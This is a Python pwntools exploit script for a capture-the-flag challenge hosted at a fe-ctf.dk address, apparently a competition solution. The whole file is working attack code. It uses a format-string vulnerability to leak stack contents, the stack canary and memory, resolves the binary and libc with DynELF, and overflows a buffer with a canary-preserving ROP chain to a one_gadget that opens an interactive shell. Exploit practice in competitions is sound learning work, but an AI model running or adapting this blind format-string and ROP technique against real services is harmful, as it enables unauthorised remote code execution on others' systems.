#!/usr/bin/env python3
from pwn import *

context.arch      = 'amd64' # [ amd64 | i386 ]
context.os        = 'linux'
context.endian    = 'little'

HOST, PORT = "jump-in-blind.hack.fe-ctf.dk", 1337

@MemLeak
def leaker(addr):
  r.recvuntil(b">> ")
  r.send(b'AA' + f'%7$s'.encode() + b'BB'  + p64(addr))
  leak = r.recvline()
  get = leak.split(b'AA')[1].split(b'BB')[0] + b'\x00'
  return get

def leak_binary(start, n):
  binary = b""
  off = 0
  while off < n:
    try:
      leaked  = leaker(start+off)
      off    += len(leaked)
      binary += leaked
    except:
      return binary
  return binary

def main():

  # Leak binary pointer and canary
  bptr, canary = None, None
  stack = []
  for i in range(7,30):
    r.sendafter(b">> ", f'%{i}$p'.encode())
    leak = r.recvline().decode().strip()
    if not bptr and ('0x55' == leak[:4] or '0x56' == leak[:4]):
      bptr = int(leak, 16)
    if not canary and len(leak) >= 8*2+1 and leak[-2:] == '00':
      canary = int(leak, 16)
    stack.append(leak)
  if not bptr:
    log.failure('Pointer for binary not found')
    print(stack)
    return 1
  if not canary:
    log.failure('Canary not found')
    print(stack)
    return 1

  log.info('Possible binary ptr: ' + hex(bptr))
  log.info('Canary: ' + hex(canary))

  try:
    base = DynELF.find_base(leaker, bptr)
  except:
    log.failure('DynELF leaking base failed')
    return 1

  # 0x0000000000028487: pop r12; pop r13; ret;
  gadget_offset = 0x0000000000028487
  # one_gadget
  win_offset = 0xcbd1a

  # Leak the binary
  stuff=leaker.n(base+0x1250, 0x300)

  try:
    # Find function based on the bytes shown below:
    #   15:   48 89 45 f8             mov    QWORD PTR [rbp-0x8], rax
    #   19:   31 c0                   xor    eax, eax
    #   1b:   48 c7 45 c0 00 00 00    mov    QWORD PTR [rbp-0x40], 0x0
    func_addr = base+0x1250+stuff.index(b'\x48\x89\x45\xf8\x31\xc0\x48\xc7\x45')-0x15
  except:
    log.failure('Could not find pattern for vuln function')
    # print(disasm(leaker.n(base+0x1250, 0x200)))
    return 1

  # Leak vulnerable function
  code = leaker.n(func_addr, 200)

  # Extract buffer size
  size = leaker.n(func_addr+0x8, 4)[-1]

  # Extract number of bytes read
  # 7b:   ba 33 00 00 00          mov    edx, 0x33
  read_n = code[code.index(b'\xba')+1]

  # Check if overflow sufficient
  if read_n < size-8 + 8 + 8 + 2*8+ 8:
    # buf + canary + rbp + gadget + 2*p64(0) + one_gadget
    log.failure('Overflow is not sufficient')
    return 1

  # Find libc base
  d    = DynELF(leaker, base)
  libc = d.lookup(None, 'libc.so')

  # Build payload
  ret  = b''
  ret += b'A'*(size-8)
  ret += p64(canary)
  ret += b'A'*8
  ret += p64(libc + gadget_offset) 
  ret += p64(0)*2
  ret += p64(libc + win_offset)

  r.sendafter(b'>> ', ret)
  r.interactive()
  return 0

if __name__ == "__main__":
  r = remote(HOST, PORT)
  while main():
    r.close()
    log.info('Trying again')
    print()
    r = remote(HOST, PORT)